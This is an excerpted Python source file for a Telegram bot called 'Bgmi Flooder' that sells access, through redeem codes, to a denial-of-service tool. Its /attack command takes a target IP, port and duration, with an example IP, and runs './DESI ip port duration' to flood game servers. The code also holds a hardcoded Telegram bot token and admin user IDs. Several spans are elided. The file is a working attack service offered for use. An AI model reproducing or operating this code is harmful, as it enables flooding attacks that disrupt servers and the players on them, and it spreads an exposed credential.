...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7367564578:AAGo6w_OaBa-LXCxsmpboBjAboGZPeS0b5U'
ADMIN_USER_ID = 1725783398 
ADMIN_USER_ID = 1725783398 
...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!\n✅ Send this command for information: /help*", parse_mode='Markdown')
        return

    message = (
        "*🔥 Welcome to the Bgmi Flooder 🔥*\n\n"
        "*🔹 Thanks for choosing team bgmi 🔸*\n"
...
async def attack(update: Update, context: CallbackContext):
    ...
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*🤦‍♂️ Usage: /attack <target> <port> <duration>\n\n🤷‍♀️ Example: /attack 20.235.19.190 14272 120*", parse_mode='Markdown')
        return
    ...
    if argument_type == 3:
        attack_command = f"./DESI {ip} {port} {duration}"
...
async def run_attack(chat_id, attack_command, context):
    try:
        ...
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n\n*You can kill offline players and send feedback must.*\n*Powered by team bgmi.*", parse_mode='Markdown')
...
async def generate_redeem_code(update: Update, context: CallbackContext):
    ...
    if len(context.args) > (2 if custom_code else 1):
        try:
            ...
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="*⚠️ Please provide a valid number for max users.*", 
                parse_mode='Markdown'
            )
            return
...
async def redeem_code(update: Update, context: CallbackContext):
    ...
    await context.bot.send_message(chat_id=chat_id, text="*✅ Redeem code applied!*\n*Thanks for using team bgmi service*\n*You can now use the bot.*", parse_mode='Markdown')
